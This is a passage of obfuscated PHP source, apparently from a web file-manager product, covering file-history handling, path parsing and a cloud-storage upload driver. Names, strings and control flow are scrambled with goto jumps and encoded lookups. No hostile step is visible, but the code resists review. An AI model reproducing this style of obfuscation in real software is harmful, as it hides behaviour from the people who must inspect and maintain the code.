$_SERVER[í¤âËÚ£¶íÊ¢]; $A¾ÂŞ»Éò = self::listData($dŠÄ¡…ë–š, $B£õãáòÂ™); if (!$A¾ÂŞ»Éò) { return !1; } foreach ($A¾ÂŞ»Éò[$D³ŠêÂªŠ[375]] as $CÅ«µÊ¼¸”) { IO::remove($A¾ÂŞ»Éò[$D³ŠêÂªŠ[1089]] . $CÅ«µÊ¼¸”[$D³ŠêÂªŠ[28]]); } return self::saveData($A¾ÂŞ»Éò[$D³ŠêÂªŠ[1090]], array()); } public static function moveHistory($DÚ…‰®÷¬, $Cùµí•‡Ä = '', $fìœŠÖ¼„† = '') { goto eîÁã•Á÷ò; cÏ¯ë·º°: self::saveData($F«¸¶ƒ¸Ò[$eã’îÓö–ğ[1090]], $F«¸¶ƒ¸Ò[$eã’îÓö–ğ[375]]); self::clearEmptyFolder($F«¸¶ƒ¸Ò[$eã’îÓö–ğ[1089]]); goto CÀç²ÂŠ‘; D­‘Œ¯³§³: $fçÄƒëåÃœ = substr(get_path_this($F«¸¶ƒ¸Ò[$eã’îÓö–ğ[1090]]), 0, -strlen($B…Ÿ°‚œÆ‘)); foreach ($F«¸¶ƒ¸Ò[$eã’îÓö–ğ[375]] as $AùÑŸí˜ô± => $c¢ñÎµµŒà) { $a»×‹›…‹ = $Cùµí•‡Ä . substr($c¢ñÎµµŒà[$eã’îÓö–ğ[28]], strlen($fçÄƒëåÃœ)); $F·ç­‰íË = IO::move($F«¸¶ƒ¸Ò[$eã’îÓö–ğ[1089]] . $c¢ñÎµµŒà[$eã’îÓö–ğ[28]], $fìœŠÖ¼„†, !1, $a»×‹›…‹); if ($F·ç­‰íË) { $F«¸¶ƒ¸Ò[$eã’îÓö–ğ[375]][$AùÑŸí˜ô±][$eã’îÓö–ğ[28]] = $a»×‹›…‹; } } $F«¸¶ƒ¸Ò[$eã’îÓö–ğ[1090]] = IO::move($F«¸¶ƒ¸Ò[$eã’îÓö–ğ[1090]], $fìœŠÖ¼„†, !1, $Cùµí•‡Ä . $B…Ÿ°‚œÆ‘); goto cÏ¯ë·º°; eîÁã•Á÷ò: $eã’îÓö–ğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F«¸¶ƒ¸Ò = self::listData($DÚ…‰®÷¬, !1); if (!$F«¸¶ƒ¸Ò || !$F«¸¶ƒ¸Ò[$eã’îÓö–ğ[375]]) { return !1; } goto Bç‡ø¤†º†; Bç‡ø¤†º†: $B…Ÿ°‚œÆ‘ = $eã’îÓö–ğ[1077]; $Cùµí•‡Ä = $Cùµí•‡Ä ? $Cùµí•‡Ä : get_path_this($DÚ…‰®÷¬); $fìœŠÖ¼„† = $fìœŠÖ¼„† ? $fìœŠÖ¼„† : $F«¸¶ƒ¸Ò[$eã’îÓö–ğ[1089]]; goto D­‘Œ¯³§³; CÀç²ÂŠ‘: } public static function rollback($aÔùï‚‰å, $aÅÚ“÷¿İ±) { $fêÛÊö¥­ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÜÅö¬™„£ = self::listData($aÔùï‚‰å); if (!$eÜÅö¬™„£) { return; } $AÒõôñ ‰ø = IO::info($aÔùï‚‰å); foreach ($eÜÅö¬™„£[$fêÛÊö¥­ô[375]] as $CÃÜÃé¦ğ => $Bº¾¨ŞôÂ¤) { if ($Bº¾¨ŞôÂ¤[$fêÛÊö¥­ô[397]] == $aÅÚ“÷¿İ±) { self::add($aÔùï‚‰å); $aŸ¨¬…ò = $eÜÅö¬™„£[$fêÛÊö¥­ô[1089]] . $Bº¾¨ŞôÂ¤[$fêÛÊö¥­ô[28]]; $dÍÃÜ„Œ’¡ = IO::copy($aŸ¨¬…ò, IO::pathFather($aÔùï‚‰å), REPEAT_REPLACE, $AÒõôñ ‰ø[$fêÛÊö¥­ô[28]]); if ($dÍÃÜ„Œ’¡) { self::remove($aÔùï‚‰å, $aÅÚ“÷¿İ±); } return $dÍÃÜ„Œ’¡; } } return !1; } public static function setDetail($Cğó¦½ãÙ, $Bä×¿Äˆ, $a¿µÈ¤»±§) { $F‘Ï›ê‡Ñá =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f»¤ÚéƒÓ = self::listData($Cğó¦½ãÙ); if (!$f»¤ÚéƒÓ) { return; } foreach ($f»¤ÚéƒÓ[$F‘Ï›ê‡Ñá[375]] as $AÄ»À‹„ƒ÷ => $f³¿÷Ù›™é) { if ($f³¿÷Ù›™é[$F‘Ï›ê‡Ñá[397]] == $Bä×¿Äˆ) { $f»¤ÚéƒÓ[$F‘Ï›ê‡Ñá[375]][$AÄ»À‹„ƒ÷][$F‘Ï›ê‡Ñá[1088]] = $a¿µÈ¤»±§; self::saveData($f»¤ÚéƒÓ[$F‘Ï›ê‡Ñá[1090]], $f»¤ÚéƒÓ[$F‘Ï›ê‡Ñá[375]]); return !0; } } return !1; } public static function fileInfo($DàØÈ†…, $E•êø£èÉµ) { goto F×Ü¨Ö½Ë§; F×Ü¨Ö½Ë§: $dÁÚğÒ·“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aáÔ‰Úóá = self::listData($DàØÈ†…); if (!$aáÔ‰Úóá) { show_json(LNG($dÁÚğÒ·“[114]), !1); } goto fªá¨­­›é; fªá¨­­›é: $eìøôÎï = $dÁÚğÒ·“[33]; foreach ($aáÔ‰Úóá[$dÁÚğÒ·“[375]] as $Då±ŸŠ–±µ => $Aéä±ø·áË) { if ($Aéä±ø·áË[$dÁÚğÒ·“[397]] != $E•êø£èÉµ) { continue; } $eìøôÎï = $aáÔ‰Úóá[$dÁÚğÒ·“[1089]] . $Aéä±ø·áË[$dÁÚğÒ·“[28]]; break; } if (!$eìøôÎï) { show_json(LNG($dÁÚğÒ·“[114]), !1); } goto BšÃÆ´ï„Š; BšÃÆ´ï„Š: return IO::info($eìøôÎï); goto F‰†ƒÅè·º; F‰†ƒÅè·º: } public static function fileOut($DÕ‡‘ÜÙßŒ, $Cæ‰Éï‰Ğ¾, $B·“ÊÛ¢ØÕ = false) { $Cµˆ‹Ü–¼Ÿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F­ÉÎ‹‹— = self::fileInfo($DÕ‡‘ÜÙßŒ, $Cæ‰Éï‰Ğ¾); $bï™ ÉÅÔ =& $GLOBALS[$Cµˆ‹Ü–¼Ÿ[7]]; $B·“ÊÛ¢ØÕ = isset($bï™ ÉÅÔ[$Cµˆ‹Ü–¼Ÿ[1054]]) && $bï™ ÉÅÔ[$Cµˆ‹Ü–¼Ÿ[1054]] == 1; if (isset($bï™ ÉÅÔ[$Cµˆ‹Ü–¼Ÿ[29]]) && $bï™ ÉÅÔ[$Cµˆ‹Ü–¼Ÿ[29]] == $Cµˆ‹Ü–¼Ÿ[1091]) { return IO::fileOutImage($F­ÉÎ‹‹—[$Cµˆ‹Ü–¼Ÿ[85]], $bï™ ÉÅÔ[$Cµˆ‹Ü–¼Ÿ[1092]]); } IO::fileOut($F­ÉÎ‹‹—[$Cµˆ‹Ü–¼Ÿ[85]], $B·“ÊÛ¢ØÕ, get_path_this($DÕ‡‘ÜÙßŒ)); } public static function listData($fÎáÈó­…, $c•»Õ¢š¾ê = true) { goto B»õ™ÈêØ; cßöÇ” «„: if (substr($fÎáÈó­…, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $E¥Ú‹¸¶«Ô = self::pathHistory($fÎáÈó­…); $A÷†‘¨œ—Ò = array($f‚¥Š‚é†[1090] => $E¥Ú‹¸¶«Ô . $f‚¥Š‚é†[1077], $f‚¥Š‚é†[1089] => rtrim(get_path_father($E¥Ú‹¸¶«Ô), $f‚¥Š‚é†[8]) . $f‚¥Š‚é†[8], $f‚¥Š‚é†[375] => array()); goto C‘ï¿’İ; C‘ï¿’İ: $B˜Ì·Ñìöæ = IO::getContent($A÷†‘¨œ—Ò[$f‚¥Š‚é†[1090]]); if ($B˜Ì·Ñìöæ) { $B„íÛ–ìÁš = json_decode($B˜Ì·Ñìöæ, !0); if (is_array($B„íÛ–ìÁš)) { $A÷†‘¨œ—Ò[$f‚¥Š‚é†[375]] = $B„íÛ–ìÁš; } } return $A÷†‘¨œ—Ò; goto D…‘ßŒ…éè; B»õ™ÈêØ: $f‚¥Š‚é† =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($c•»Õ¢š¾ê && !IO::exist($fÎáÈó­…)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto cßöÇ” «„; D…‘ßŒ…éè: } private static function saveData($FÛèÎ°ù², $EƒÚÒÔÜÌ) { goto eÉŠ¡ÕÑãÂ; BØ•Ã’™¤Ö: return !0; goto Eø‹ÛĞ¹„; eÉŠ¡ÕÑãÂ: $C¿Ó…İËÙÙ =& $_SERVER[í¤âËÚ£¶íÊ¢]; self::log($C¿Ó…İËÙÙ[1093] . $FÛèÎ°ù² . $C¿Ó…İËÙÙ[77] . count($EƒÚÒÔÜÌ), $C¿Ó…İËÙÙ[696]); if ($EƒÚÒÔÜÌ) { return IO::setContent($FÛèÎ°ù², json_encode($EƒÚÒÔÜÌ)); } goto DÍ’ÃùÀÆï; DÍ’ÃùÀÆï: $B‰ÇêÇÆ· = IO::pathFather($FÛèÎ°ù²); IO::remove($FÛèÎ°ù²); self::clearEmptyFolder($B‰ÇêÇÆ·); goto BØ•Ã’™¤Ö; Eø‹ÛĞ¹„: } public static function clearEmptyFolder($c»¸ñÎøò¬) { goto b‚×·œáó; D£±¿âéç¤: $FºÎ‚•£ƒæ = IO::has($c»¸ñÎøò¬, !0); if ($FºÎ‚•£ƒæ[$cÇ¸¶¢ˆŞÌ[211]] > 0 || $FºÎ‚•£ƒæ[$cÇ¸¶¢ˆŞÌ[212]] > 0) { return; } IO::remove($c»¸ñÎøò¬); goto d¬çÔœÔ±; d¬çÔœÔ±: self::clearEmptyFolder($E¥öİ…ÇÃƒ); goto e¦ø«‡Èö¦; b‚×·œáó: $cÇ¸¶¢ˆŞÌ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (trim($c»¸ñÎøò¬, $cÇ¸¶¢ˆŞÌ[8]) == trim(self::$_historyBase, $cÇ¸¶¢ˆŞÌ[8])) { return; } $E¥öİ…ÇÃƒ = IO::pathFather($c»¸ñÎøò¬); goto D£±¿âéç¤; e¦ø«‡Èö¦: } private static function getBasePath() { goto b‹ÖŒ©óëÒ; C©İ…¥‰ˆë: file_put_contents($D†Ø·Šù . $a¼äëê¬Ç[1097], $a¼äëê¬Ç[33]); Model($a¼äëê¬Ç[1094])->set($a¼äëê¬Ç[1095], $D†Ø·Šù); return $D†Ø·Šù; goto DÇ‹ŸŸÈ·; b‹ÖŒ©óëÒ: $a¼äëê¬Ç =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D†Ø·Šù = Model($a¼äëê¬Ç[1094])->get($a¼äëê¬Ç[1095]); if (IO::exist($D†Ø·Šù)) { return $D†Ø·Šù; } goto D¸éäÔŠ—·; D¸éäÔŠ—·: $D†Ø·Šù = DATA_PATH . $a¼äëê¬Ç[1096]; $D†Ø·Šù = IO::mkdir($D†Ø·Šù); $D†Ø·Šù = rtrim($D†Ø·Šù, $a¼äëê¬Ç[8]) . $a¼äëê¬Ç[8]; goto C©İ…¥‰ˆë; DÇ‹ŸŸÈ·: } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\x72\122\x65\x63\171\x63\154\145\175"; const KOD_USER_FAV = "\x7b\x75\163\145\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\145\x72\x46\x69\x6c\145\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\x46\x69\154\x65\x54\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\x52\157\157\x74\x53\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\x53\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\x53\150\141\162\x65\x4c\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\162\145\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\145\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\141\x72\x65\111\x74\145\155\114\151\156\x6b\175"; const KOD_SEARCH = "\173\163\145\141\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\153\175"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\162\122\x65\x6e\143\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\x76\145\x72\175"; public static function typeList() { $b¦‡Ó¢ğĞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return array($b¦‡Ó¢ğĞ[1098] => self::KOD_SOURCE, $b¦‡Ó¢ğĞ[1099] => self::KOD_USER_RECYCLE, $b¦‡Ó¢ğĞ[1100] => self::KOD_USER_FAV, $b¦‡Ó¢ğĞ[1101] => self::KOD_USER_FILE_TAG, $b¦‡Ó¢ğĞ[1102] => self::KOD_USER_FILE_TYPE, $b¦‡Ó¢ğĞ[1103] => self::KOD_GROUP_ROOT_SELF, $b¦‡Ó¢ğĞ[1104] => self::KOD_USER_SHARE, $b¦‡Ó¢ğĞ[1105] => self::KOD_USER_SHARE_LINK, $b¦‡Ó¢ğĞ[1106] => self::KOD_USER_SHARE_TO_ME, $b¦‡Ó¢ğĞ[1107] => self::KOD_SHARE_ITEM, $b¦‡Ó¢ğĞ[1108] => self::KOD_SHARE_LINK, $b¦‡Ó¢ğĞ[1109] => self::KOD_SEARCH, $b¦‡Ó¢ğĞ[1110] => self::KOD_BLOCK, $b¦‡Ó¢ğĞ[1111] => self::KOD_IO, $b¦‡Ó¢ğĞ[1112] => self::KOD_USER_RECENT, $b¦‡Ó¢ğĞ[1113] => self::KOD_USER_DRIVER); } public static function parse($cŒ†£”ÏöĞ) { goto A´å¼ç¸£„; A´å¼ç¸£„: $FŞìÉ°¿ÀØ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cŒ†£”ÏöĞ = self::clear($cŒ†£”ÏöĞ); $AòÒÖ…Ÿ¾› = array_values(self::typeList()); goto c¸Ù§èÇÕæ; c¸Ù§èÇÕæ: preg_match($FŞìÉ°¿ÀØ[1114], $cŒ†£”ÏöĞ, $FğÈ‡·áÚ); $fØÕØšøö = array($FŞìÉ°¿ÀØ[418] => !1, $FŞìÉ°¿ÀØ[1115] => !1, $FŞìÉ°¿ÀØ[415] => !1, $FŞìÉ°¿ÀØ[85] => $cŒ†£”ÏöĞ, $FŞìÉ°¿ÀØ[1025] => !1, $FŞìÉ°¿ÀØ[1024] => $FŞìÉ°¿ÀØ[33]); if (is_array($FğÈ‡·áÚ) && count($FğÈ‡·áÚ) == 5) { $d•ÏÛ¦ê· = $FŞìÉ°¿ÀØ[1116] . $FğÈ‡·áÚ[2] . $FŞìÉ°¿ÀØ[332]; if (in_array($d•ÏÛ¦ê·, $AòÒÖ…Ÿ¾›)) { $fØÕØšøö[$FŞìÉ°¿ÀØ[1025]] = $FğÈ‡·áÚ[1]; $fØÕØšøö[$FŞìÉ°¿ÀØ[29]] = $d•ÏÛ¦ê·; $fØÕØšøö[$FŞìÉ°¿ÀØ[1117]] = substr($d•ÏÛ¦ê·, 1, -1); $fØÕØšøö[$FŞìÉ°¿ÀØ[397]] = $FğÈ‡·áÚ[3]; } $fØÕØšøö[$FŞìÉ°¿ÀØ[1024]] = $FğÈ‡·áÚ[4]; } goto fÊ¯ª•¹; fÊ¯ª•¹: $E’ò‹ƒëš­ = array($FŞìÉ°¿ÀØ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $fØÕØšøö[$FŞìÉ°¿ÀØ[1079]] = in_array($fØÕØšøö[$FŞìÉ°¿ÀØ[29]], $E’ò‹ƒëš­); return $fØÕØšøö; goto a¥™ôÃ¬ˆË; a¥™ôÃ¬ˆË: } public static function isTruePath($F²ªºà¦„¹) { goto bíÂïÛ’§–; b…±£º¸š„: if (strpos($F²ªºà¦„¹, $BÑ¼—†Ê½[1082]) === 0) { return !0; } if (strpos($F²ªºà¦„¹, $BÑ¼—†Ê½[1118]) === 0) { return !0; } if (strpos($F²ªºà¦„¹, $BÑ¼—†Ê½[1118]) === 0) { return !0; } goto A¸î¶è«ÜÂ; bíÂïÛ’§–: $BÑ¼—†Ê½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (substr($F²ªºà¦„¹, 0, 1) != $BÑ¼—†Ê½[1116]) { return !0; } if (strpos($F²ªºà¦„¹, $BÑ¼—†Ê½[404]) === 0) { return !0; } goto b…±£º¸š„; A¸î¶è«ÜÂ: if (strpos($F²ªºà¦„¹, $BÑ¼—†Ê½[1119]) === 0) { return !0; } return !1; goto fœß›äÆ; fœß›äÆ: } public static function clear($E¾­ÕºÃÖ) { goto EíÏ¢‰°; B½ºÚ¸ßÔ±: $d¬âŠ£•Ó = $d‹…Š‚èÀ[1120]; if (substr($E¾­ÕºÃÖ, 0, 3) == $d‹…Š‚èÀ[1121]) { $E¾­ÕºÃÖ = substr($E¾­ÕºÃÖ, 3); } while (strstr($E¾­ÕºÃÖ, $d¬âŠ£•Ó)) { $E¾­ÕºÃÖ = str_replace($d¬âŠ£•Ó, $d‹…Š‚èÀ[8], $E¾­ÕºÃÖ); } goto e‚£Ë»â‡„; EíÏ¢‰°: $d‹…Š‚èÀ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E¾­ÕºÃÖ = str_replace(array($d‹…Š‚èÀ[998], $d‹…Š‚èÀ[63]), $d‹…Š‚èÀ[50], $E¾­ÕºÃÖ); $E¾­ÕºÃÖ = str_replace($d‹…Š‚èÀ[106], $d‹…Š‚èÀ[8], $E¾­ÕºÃÖ); goto B½ºÚ¸ßÔ±; d¤­ˆíª´: return $E¾­ÕºÃÖ; goto CÑ¸™‹ğ¯‡; e‚£Ë»â‡„: $E¾­ÕºÃÖ = preg_replace($d‹…Š‚èÀ[1122], $d‹…Š‚èÀ[8], $E¾­ÕºÃÖ); if ($E¾­ÕºÃÖ == $d‹…Š‚èÀ[8]) { return $d‹…Š‚èÀ[8]; } $E¾­ÕºÃÖ = rtrim($E¾­ÕºÃÖ, $d‹…Š‚èÀ[8]); goto d¤­ˆíª´; CÑ¸™‹ğ¯‡: } public static function sourceID($C£ ¨¡Œ°) { $e¨Ïô’İçö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d‡¿Ñ×ö = self::parse($C£ ¨¡Œ°); if ($d‡¿Ñ×ö[$e¨Ïô’İçö[29]] !== self::KOD_SOURCE) { show_json(LNG($e¨Ïô’İçö[1123]), !1); } return $d‡¿Ñ×ö[$e¨Ïô’İçö[397]]; } public static function make($C…¬…èš¤¾) { if (!$C…¬…èš¤¾) { return !1; } return self::makePath(self::KOD_SOURCE, intval($C…¬…èš¤¾)); } public static function makeShare($Eƒà‚ÙŸâ¨, $a› ö¢Ãó) { return self::makePath(self::KOD_SHARE_ITEM, $Eƒà‚ÙŸâ¨, $a› ö¢Ãó); } public static function makeFileTypePath($EŸ‚Ó‰…°˜) { return self::makePath(self::KOD_USER_FILE_TYPE, $EŸ‚Ó‰…°˜); } public static function makeFileTagPath($DØ‹ªÁìØƒ) { return self::makePath(self::KOD_USER_FILE_TAG, $DØ‹ªÁìØƒ); } public static function makePath($BÆ‘õß½¸‚, $AÆ‰à¹™ëÂ = '', $AÀŞ£ç¸æï = '') { $d²¯ÃÕÁ‡ó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eôæì‡´‰ä = substr($BÆ‘õß½¸‚, 1, -1); $Dº«‹¾ˆŒ– = $d²¯ÃÕÁ‡ó[1124] . $eôæì‡´‰ä . $d²¯ÃÕÁ‡ó[1125] . $AÆ‰à¹™ëÂ . $d²¯ÃÕÁ‡ó[1126]; $Dº«‹¾ˆŒ– = $AÀŞ£ç¸æï ? $Dº«‹¾ˆŒ– . $AÀŞ£ç¸æï . $d²¯ÃÕÁ‡ó[8] : $Dº«‹¾ˆŒ–; return $Dº«‹¾ˆŒ–; } public static function hashPath($eŒ‰ÔÄ‰á) { goto f½‹ÌíÍø´; c¼¾ËÙÊ—: if (!$aµÄê ÷¶ë && isset($CÂ›éí­¥[$eò¦”÷ä[399]])) { $CÂ›éí­¥ = IO::info(KodIO::make($CÂ›éí­¥[$eò¦”÷ä[399]])); $aµÄê ÷¶ë = _get($CÂ›éí­¥, $eò¦”÷ä[1127], $eò¦”÷ä[33]); } if (!$aµÄê ÷¶ë) { $bÍ°ÜÈô±¦ = KodIO::parse($CÂ›éí­¥[$eò¦”÷ä[85]]); if (!$bÍ°ÜÈô±¦[$eò¦”÷ä[29]]) { $aµÄê ÷¶ë = IO::hashSimple($CÂ›éí­¥[$eò¦”÷ä[85]]); } } if (!$aµÄê ÷¶ë) { $aµÄê ÷¶ë = md5($CÂ›éí­¥[$eò¦”÷ä[85]] . $CÂ›éí­¥[$eò¦”÷ä[87]] . $CÂ›éí­¥[$eò¦”÷ä[93]]); } goto B³–Œ¸Ç; f½‹ÌíÍø´: $eò¦”÷ä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÂ›éí­¥ = is_array($eŒ‰ÔÄ‰á) ? $eŒ‰ÔÄ‰á : IO::info($eŒ‰ÔÄ‰á); $aµÄê ÷¶ë = _get($CÂ›éí­¥, $eò¦”÷ä[1127], $eò¦”÷ä[33]); goto c¼¾ËÙÊ—; B³–Œ¸Ç: return $aµÄê ÷¶ë; goto f°ÈÙÓ¤“Õ; f°ÈÙÓ¤“Õ: } public static function initSystemPath() { goto B¢£ñçéë; Dˆ‰À¾¡å: IOHistory::bindEvent(); goto açÇãï–Œ; bõ¨¤Ñ‰¸: define($B‡¨ÃÅåÆ[1130], self::systemPath($B‡¨ÃÅåÆ[1131])); define($B‡¨ÃÅåÆ[1132], self::systemPath($B‡¨ÃÅåÆ[1133])); define($B‡¨ÃÅåÆ[1134], self::systemPath($B‡¨ÃÅåÆ[1135])); goto Dˆ‰À¾¡å; B¢£ñçéë: $B‡¨ÃÅåÆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (defined($B‡¨ÃÅåÆ[1128])) { return; } define($B‡¨ÃÅåÆ[1128], self::systemPath($B‡¨ÃÅåÆ[1129])); goto bõ¨¤Ñ‰¸; açÇãï–Œ: } public static function systemPath($d–²Ø¢¿§ï) { goto cĞ”ÛÀÑÅî; E‘êøã›: if ($eÉ…óÔñ›) { return $eÉ…óÔñ›; } if ($d–²Ø¢¿§ï == $bƒ¶–µŒÁ[1129]) { $eÉ…óÔñ› = self::make(Model($bƒ¶–µŒÁ[759])->systemRootPathAdd($bƒ¶–µŒÁ[509])); } else { $eÉ…óÔñ› = self::systemPath($bƒ¶–µŒÁ[1129]); $e¡×½ˆéß = self::sourceID($eÉ…óÔñ›); $eÉ…óÔñ› = self::make(Model($bƒ¶–µŒÁ[759])->mkdir($e¡×½ˆéß, $d–²Ø¢¿§ï)); } Model($bƒ¶–µŒÁ[1084])->set($f¦¿Œ·Å¿Ã, $eÉ…óÔñ›); goto B•¿¸í…Ï´; cĞ”ÛÀÑÅî: $bƒ¶–µŒÁ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f¦¿Œ·Å¿Ã = $bƒ¶–µŒÁ[1136] . ucfirst($d–²Ø¢¿§ï); $eÉ…óÔñ› = Model($bƒ¶–µŒÁ[1084])->get($f¦¿Œ·Å¿Ã); goto E‘êøã›; B•¿¸í…Ï´: return $eÉ…óÔñ›; goto cé”¨Òá¡; cé”¨Òá¡: } public static function systemFolder($FÇÄÆ‘ˆñœ) { $bæğ¹øÙ¾ = IO_PATH_SYSTEM_SOURCE . $FÇÄÆ‘ˆñœ; $Dîµ¤„‘Ï° = Cache::get($bæğ¹øÙ¾); if (!$Dîµ¤„‘Ï°) { $A–Ì„÷åÃ¨ = IO::infoFull($bæğ¹øÙ¾); if (!$A–Ì„÷åÃ¨) { $Dîµ¤„‘Ï° = IO::mkdir($bæğ¹øÙ¾, REPEAT_SKIP); } else { $Dîµ¤„‘Ï° = $A–Ì„÷åÃ¨[$_SERVER[í¤âËÚ£¶íÊ¢][85]]; } Cache::set($bæğ¹øÙ¾, $Dîµ¤„‘Ï°, 3600 * 10); } return $Dîµ¤„‘Ï°; } public static function defaultDriver() { return Model($_SERVER[í¤âËÚ£¶íÊ¢][708])->defaultDriver(); } public static function defaultIO() { $bòàé¥ˆÊ¯ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f›¤ÜËŒ‡ = self::defaultDriver(); return $bòàé¥ˆÊ¯[1137] . $f›¤ÜËŒ‡[$bòàé¥ˆÊ¯[397]] . $bòàé¥ˆÊ¯[1126]; } public static function defaultDriverInit() { static $c¨»§ìßØ¦ = false; if ($c¨»§ìßØ¦) { return $c¨»§ìßØ¦; } $c¨»§ìßØ¦ = IO::init(self::defaultIO()); return $c¨»§ìßØ¦; } public static function fileTypeList() { $c¼ø®Ø‘ê’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E„³‰à²­• = $GLOBALS[$c¼ø®Ø‘ê’[6]][$c¼ø®Ø‘ê’[1138]]; foreach ($E„³‰à²­• as $c‘·í§º‹ => $b‡Ù»„¡÷) { $A‡´‡ÎËÀø = $c¼ø®Ø‘ê’[1139] . $c‘·í§º‹; $bĞæ¡Ê‘® = LNG($A‡´‡ÎËÀø); if ($A‡´‡ÎËÀø != $bĞæ¡Ê‘®) { $E„³‰à²­•[$c‘·í§º‹][$c¼ø®Ø‘ê’[28]] = $bĞæ¡Ê‘®; } } return $E„³‰à²­•; } public static function transferType($f…é“ÈŒîæ, $EÑ†õš½œ) { goto B¤½Õçİ†Ÿ; EÊ“Îê»øŠ: if ($B‘œí¸£[$A¬Ø¡Ùä¸[29]] == $cºˆä¯¸Ê[$A¬Ø¡Ùä¸[29]] && $B‘œí¸£[$A¬Ø¡Ùä¸[1140]] == $cºˆä¯¸Ê[$A¬Ø¡Ùä¸[1140]]) { return $A¬Ø¡Ùä¸[1141]; } if ($B‘œí¸£[$A¬Ø¡Ùä¸[29]] == $A¬Ø¡Ùä¸[792] && $cºˆä¯¸Ê[$A¬Ø¡Ùä¸[29]] == $A¬Ø¡Ùä¸[115]) { return $A¬Ø¡Ùä¸[1054]; } if ($B‘œí¸£[$A¬Ø¡Ùä¸[29]] == $A¬Ø¡Ùä¸[115] && $cºˆä¯¸Ê[$A¬Ø¡Ùä¸[29]] == $A¬Ø¡Ùä¸[792]) { return $A¬Ø¡Ùä¸[116]; } goto eïÎŒÚ›·°; B¤½Õçİ†Ÿ: $A¬Ø¡Ùä¸ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B‘œí¸£ = self::driverType($f…é“ÈŒîæ); $cºˆä¯¸Ê = self::driverType($EÑ†õš½œ); goto EÊ“Îê»øŠ; eïÎŒÚ›·°: return $A¬Ø¡Ùä¸[1142]; goto Còª„¯™„; Còª„¯™„: } public static function driverType($cªÙËÉ§š) { goto cÔÑ£âæ; aõÑ­â¡: return array($Bõ†âáø®Ñ[29] => $Bõ†âáø®Ñ[792], $Bõ†âáø®Ñ[1140] => $cªÙËÉ§š->pathDriver, $Bõ†âáø®Ñ[85] => $eÚìè¯¨ÊÃ); goto bå¦ºªæÜ‚; eŒÎâ™é·³: if ($bƒÛØ¥Ãá‡ == $Bõ†âáø®Ñ[699] || $bƒÛØ¥Ãá‡ == $Bõ†âáø®Ñ[1144] || $bƒÛØ¥Ãá‡ == $Bõ†âáø®Ñ[1145]) { $cªÙËÉ§š = self::defaultDriverInit(); } else { if ($bƒÛØ¥Ãá‡ == $Bõ†âáø®Ñ[1061] || $bƒÛØ¥Ãá‡ == $Bõ†âáø®Ñ[1146]) { $cªÙËÉ§š = IO::init($cªÙËÉ§š->pathParse[$Bõ†âáø®Ñ[1008]]); } } $bƒÛØ¥Ãá‡ = str_replace($Bõ†âáø®Ñ[1143], $Bõ†âáø®Ñ[33], strtolower($cªÙËÉ§š->getType())); if ($bƒÛØ¥Ãá‡ == $Bõ†âáø®Ñ[115]) { return array($Bõ†âáø®Ñ[29] => $Bõ†âáø®Ñ[115], $Bõ†âáø®Ñ[1140] => $Bõ†âáø®Ñ[33], $Bõ†âáø®Ñ[85] => $eÚìè¯¨ÊÃ); } goto aõÑ­â¡; cÔÑ£âæ: $Bõ†âáø®Ñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÚìè¯¨ÊÃ = $cªÙËÉ§š->path; $bƒÛØ¥Ãá‡ = str_replace($Bõ†âáø®Ñ[1143], $Bõ†âáø®Ñ[33], strtolower($cªÙËÉ§š->getType())); goto eŒÎâ™é·³; bå¦ºªæÜ‚: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($cÔÊ‰Ô ¥Ğ) { parent::__construct($cÔÊ‰Ô ¥Ğ); $this->signatureVersion($_SERVER[í¤âËÚ£¶íÊ¢][220]); } public function uploadFormData($Dªº’£Œñß, $BÇ£’„ ÷ = 3600) { goto a°µ¶ÍøÈí; f§›ê„›‚Ô: $fŸ¬äÂ¹„Ó = sha1($f«•¿È…‹); $b•Ñšæèè = hash_hmac($EİØ¦º §«[237], $fŸ¬äÂ¹„Ó, $bó‹øç‡ì); $aÍ·ŒïßŸ‰ = array($EİØ¦º §«[1151] => $C¢Í¢ÊŠ, $EİØ¦º §«[1155] => $E“¤¦½ˆ¼¿, $EİØ¦º §«[1159] => base64_encode($f«•¿È…‹), $EİØ¦º §«[1156] => 